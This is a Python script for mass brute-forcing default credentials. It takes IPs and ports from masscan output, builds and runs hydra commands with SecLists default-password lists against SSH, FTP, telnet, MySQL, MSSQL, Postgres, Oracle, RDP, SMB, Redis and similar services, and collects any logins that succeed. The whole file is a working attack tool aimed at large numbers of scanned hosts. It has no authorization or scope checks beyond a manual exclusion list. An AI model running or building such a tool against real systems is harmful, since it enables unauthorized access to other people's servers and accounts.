"""
Mass bruteforce mysql, mssql, ftp, ssh, telnet, etc. with default credentials
hydra and seclists is required : apt update && apt -y install seclists hydra
"""
import subprocess
import click
import sys
from utils import get_ips_with_port, get_result_files, load_services, load_excluded, save_excluded


wordlist_defaultcreds_dir = "/usr/share/seclists/Passwords/Default-Credentials/"
wordlist_usernames_path = "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
port_and_service = load_services()


def cmd_crafter(service: str, threads: int = 4, exit_after_first_success: bool = True) -> list:
    """Craft hydra command"""
    base = ["hydra", "-V", "-I", "-t", str(threads), "-e", "nsr", "-o",
            "./result/bruteforce/hydra_{ip}_{port}.txt", "{ip}", service]
    if exit_after_first_success:
        base.append("-f")
    # Check whether to use wordlist or passlist
    if service in {"redis", "mongodb", "couchdb", "memcached", "elasticsearch", "vnc", "rdp"}:
        base.extend(
            ["-P", f"{wordlist_defaultcreds_dir}default-passwords.txt"])
        # vnc and rdp cannot specify login username
        if service not in {"vnc", "rdp"}:
            base.extend(["-L", wordlist_usernames_path])
        return base
    # Those services use PASSLIST
    wordlist_args = ["-C"]
    if service in {"mssql", "mysql", "oracle", "ftp", "ssh", "telnet", "postgres"}:
        wordlist_args.append(
            f"{wordlist_defaultcreds_dir}{service}-betterdefaultpasslist.txt")
    if service == "smb":
        wordlist_args.append(
            f"{wordlist_defaultcreds_dir}windows-betterdefaultpasslist.txt")
    return base + wordlist_args
    # End of passlist


def brute_force(ip_and_port: dict, ports_to_brute: list = None):
    """Brute force with default credentials"""
    excluded_ip_port = load_excluded()
    # Use ports stored in service.json if not specified
    if not ports_to_brute:
        ports_to_brute = port_and_service.keys()
    for ip, ports in ip_and_port.items():
        for port in ports:
            # Check if port is in excluded list
            if excluded_ip_port.get(ip) and port in excluded_ip_port[ip]:
                click.secho(
                    f"[!]Skipped! {port} on {ip} is excluded", fg="blue")
                continue
            if port not in ports_to_brute:
                continue

            cmd_str = " ".join(cmd_crafter(
                port_and_service[port])).format(ip=ip, port=port)
            click.secho(f"\n{'-'*30}", fg="yellow", bold=True)
            click.secho(f"\n[+]Bruteforcing {ip}", fg="yellow")
            print(f"[+]Command: {cmd_str}")
            click.secho(f"\n{'-'*30}", fg="yellow", bold=True)
            s = subprocess.Popen(cmd_str, shell=True)

            try:
                s.wait()
            except KeyboardInterrupt:
                s.kill()
                choice = click.prompt(
                    'Skip current command | Exclude this ip with port | Exit? : (s)Skip / e(Exclude) /(x)Exit', type=str, default='s')
                if choice.lower() == 'x':
                    click.secho("\n[!]User interrupted...Closing",
                                fg="red", bold=True)
                    exit()
                elif choice.lower() == "e":
                    if ip not in excluded_ip_port:
                        excluded_ip_port[ip] = []
                    excluded_ip_port[ip].append(port)
                    save_excluded(excluded_ip_port)
                    click.secho(
                        f"\n[!]Excluded {ip}:{port}", fg="red", bold=True)


def show_result():
    """Fetch all result files and print out idetical lines"""
    result_files = get_result_files()
    for file_path in result_files:
        result = set()  # Avoid hydra duplicate credential output
        with open(file_path, "r") as f:
            for line in f:
                if "password:" in line:
                    result.add(line)
        if result:
            click.secho(
                f"[+]Found password in {file_path}", fg="green", bold=True)
            click.echo("\n".join(result))


@click.command(help="Mass Bruteforce Script")
@click.option("-q", "--quick", is_flag=True, help="Quick mode (Only brute telnet, ssh, ftp , mysql, mssql, postgres, oracle)")
@click.option("-a", "--all-service", is_flag=True, help="Brute all services(Very Slow)")
@click.option("-s", "--show", is_flag=True, help="Show result with successful login")
@click.option("-f", "--file-path", type=click.Path(exists=True), default="./result/masscan/", show_default=True, help="The directory or file that contains masscan result")
def main(quick, show, all_service, file_path):
    if len(sys.argv) == 1:
        with click.Context(main) as ctx:
            return click.echo(ctx.get_help())
    if show:
        return show_result()
    ip_and_port = get_ips_with_port(file_path)
    # print(f"{not ip_and_port=}")
    if not ip_and_port:
        return click.secho(f"[!]No Masscan result found: {file_path}", fg="red", bold=True)
    if all_service:
        return brute_force(ip_and_port)
    if quick:
        ports_to_brute = ("21", "22", "23", "3306", "1433", "5432", "1521")
        return brute_force(ip_and_port, ports_to_brute)


if __name__ == "__main__":
    main()
